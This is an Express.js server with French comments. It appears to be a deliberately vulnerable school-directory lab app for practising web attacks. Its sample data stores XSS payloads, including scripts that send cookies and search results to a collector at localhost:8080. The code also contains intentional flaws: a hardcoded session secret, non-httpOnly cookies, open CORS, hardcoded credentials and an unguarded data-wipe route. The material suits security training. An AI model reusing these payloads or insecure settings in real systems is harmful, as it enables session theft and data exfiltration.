const express = require('express');
const session = require('express-session');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const app = express();
const port = 3000;

// Middleware standard
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Entêtes CORS
app.use(cors());

// Configuration des cookies
app.use(session({
  secret: 'SuperS3ecureC00kie',
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: false, // Ne nécessite pas HTTPS (pour env de dev)
    httpOnly: false
  }
}));

// Logger de requêtes et réponses
app.use((req, res, next) => {
  const start = Date.now();

  console.log(`➡️ ${req.method} ${req.originalUrl}`);
  if (['POST', 'PUT'].includes(req.method)) {
    console.log(`📦 Corps de la requête :`, req.body);
  }

  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(`⬅️ ${res.statusCode} ${req.method} ${req.originalUrl} - ${duration}ms`);
  });

  next();
});

// Sample data
const users = [
  { id: 1, name: 'Alice Dupont', email: 'alice@secureschool.com' },
  { id: 2, name: 'Bob Martin', email: 'bob@secureschool.com' },
  { id: 3, name: 'Chloé Morel', email: 'chloe@secureschool.com' },
  { id: 4, name: 'David Roussel', email: 'david@secureschool.com' },
  { id: 5, name: 'Émilie Legrand', email: 'emilie@secureschool.com' },
  { id: 6, name: 'François Caron', email: 'francois@secureschool.com' },
  { id: 7, name: 'Géraldine Robert', email: 'geraldine@secureschool.com' },
  { id: 8, name: 'Henri Gautier', email: 'henri@secureschool.com' },
  { id: 9, name: 'Isabelle Renault', email: 'isabelle@secureschool.com' },
  { id: 10, name: 'Julien Perrot', email: 'julien@secureschool.com' }
];
const sharedRequests = [
  { id: 1, query: 'Alice' },
  { id: 2, query: '"><img src=x onerror=alert(1)>' },
  { id: 3, query: '<script>alert("xss")</script>' },
  { id: 4, query: '<iframe src="javascript:alert(`xss`)">' },
  { id: 5, query: 'Martin' },
  { id: 6, query: '<script>fetch("/rest/search?q=").then(r => r.json()).then(d => fetch("http://localhost:8080/?data="+btoa(JSON.stringify(d))))</script>' },
  { id: 7, query: 'Test' },
  { id: 8, query: '<script>fetch("http://localhost:8080/collect?cookie=" + document.cookie);</script>' },
];

// Auth middleware
function requireAuth(req, res, next) {
  if (req.session && req.session.authenticated) return next();
  res.status(401).json({ error: 'Not authenticated' });
}

// -------- ROUTES API --------

app.post('/rest/login', (req, res) => {
  const { username, password } = req.body;
  if (username === 'secure' && password === 'school') {
    req.session.authenticated = true;
    return res.json({ success: true });
  }
  res.status(401).json({ success: false });
});

app.get('/rest/logout', requireAuth, (req, res) => {
  req.session.destroy(() => res.json({ success: true }));
});

app.get('/rest/auth', requireAuth, (req, res) => {
  res.json({ message: 'Connected' });
});

app.get('/rest/search', requireAuth, (req, res) => {
  const q = req.query.q || '';
  const results = users.filter(u =>
    u.name.toLowerCase().includes(q.toLowerCase())
  );
  res.json(results);
});

app.get('/rest/requests', requireAuth, (req, res) => {
  res.json(sharedRequests);
});

app.get('/rest/requests/:id', requireAuth, (req, res) => {
  const r = sharedRequests.find(r => r.id == req.params.id);
  if (r) res.json(r);
  else res.status(404).json({ error: 'Not found' });
});

app.post('/rest/users', requireAuth, (req, res) => {
  const { name, email } = req.body;
  if (!name || !email) return res.status(400).json({ error: 'Données manquantes' });
  const newUser = { id: users.length + 1, name, email };
  users.push(newUser);
  res.json(newUser);
});

app.put('/rest/users/:id', requireAuth, (req, res) => {
  const user = users.find(u => u.id == req.params.id);
  if (!user) return res.status(404).json({ error: 'Non trouvé' });
  user.name = req.body.name || user.name;
  user.email = req.body.email || user.email;
  res.json(user);
});

app.get('/rest/profile-photo', requireAuth, (req, res) => {
  const imagePath = path.join(__dirname, 'ressources', 'profil.jpg');
  
  fs.access(imagePath, fs.constants.F_OK, (err) => {
    if (err) {
      console.error('Fichier image introuvable.');
      return res.status(404).send('Image non trouvée');
    }

    res.sendFile(imagePath, err => {
      if (err) {
        console.error('Erreur lors de l\'envoi de la photo :', err);
        res.status(500).send('Erreur serveur');
      }
    });
  });
});

app.get('/rest/cleardb', requireAuth, (req, res) => {
  users.length = 0;
  res.json({ message: 'Tous les étudiants ont été supprimés.' });
});

// -------- SERVIR LE FRONT --------

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
  console.log(`✅ Serveur lancé sur http://localhost:${port}`);
});
